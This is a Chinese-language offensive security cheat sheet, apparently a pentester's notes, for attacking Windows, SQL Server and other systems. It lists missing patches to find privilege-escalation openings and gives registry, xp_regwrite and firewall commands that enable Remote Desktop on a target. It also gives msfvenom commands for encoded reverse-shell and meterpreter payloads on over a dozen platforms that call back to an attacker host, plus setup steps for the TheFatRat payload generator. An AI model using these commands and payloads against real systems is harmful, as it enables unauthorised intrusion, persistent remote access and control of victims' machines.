# windows提权

```
systeminfo>windowsvul.txt&(for %i in (KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780)do @type windowsvul.txt|@find /i "%i"||@echo %i you can fuck)
```

# 开启远程桌面

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD
/d 00000000 /f
```

# sql server 命令

1.是否开启远程桌面，1表示关闭，0表示开启

```
EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections'
```

2.读取远程桌面端口

```
EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
```

3.开启远程桌面

```
EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;
```

reg文件开启远程桌面：

```
Windows Registry Editor Version 5.00HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer]"fDenyTSConnections"=dword:00000000[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp]"PortNumber"=dword:00000d3d
////
```

保存`micropoor.reg`，并执行`regedit /s micropoor.reg`
注：如果第一次开启远程桌面，部分需要配置防火墙规则允许远程端口。

```
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

4.关闭远程桌面

```
EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal
Server','fDenyTSConnections','REG_DWORD',1;
```

# msfvenom常用生成payload命令

windows:

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o payload.exe
```

mac:

```bash
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho
```

android:

```
//需要签名
msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk
```

powershell:

```
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1
```

linux:

```
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf
```

php:

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw > shell.php
```

aspx:

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx
```

jsp:

```
msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.jsp
```

war:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.war
```

nodejs:

```
msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.js
```

python:

```
msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py
```

perl:

```
msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.pl
```

ruby:

```
msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.rb
```

lua:

```
msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.lua
```

windows shellcode:

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c
```

linux shellcode:

```
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c
```

mac shellcode:

```
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IPLPORT=攻击机端口 -f c
```

便捷化payload生成：
项目地址：https://github.com/Screetsec/TheFatRat

```
git clone https://github.com/Screetsec/TheFatRat.git
//设置时需要挂墙
chmod +x fatrat
chmod +x pwerfull.sh
chmod +x setup.sh
./setup.sh
```

附录：
中文使用说明：
Options:
-p, --payload <payload> 使用指定的payload
--payload-options 列出该payload参数
-l, --list [type] 列出所有的payloads
-n, --nopsled <length> 为payload指定一个 nopsled 长度
-f, --format <format> 指定payload生成格式
--help-formats 查看所有支持格式
-e, --encoder <encoder> 使用编码器
-a, --arch <arch> 指定payload构架
--platform <platform> 指定payload平台
--help-platforms 显示支持的平台
-s, --space <length> 设定payload攻击荷载的最大长度
--encoder-space <length> The maximum size of the encoded payload
(defaults to the -s value)
-b, --bad-chars <list> 指定bad-chars 如: '\x00\xff'
-i, --iterations <count> 指定编码次数
-c, --add-code <path> 指定个win32 shellcode 文件
-x, --template <path> 指定一个 executable 文件作为模板
-k, --keep payload自动分离并注入到新的进程
-o, --out <path> 存放生成的payload
-v, --var-name <name> 指定自定义变量
--smallest Generate the smallest possible payload
-h, --help 显示帮助文件
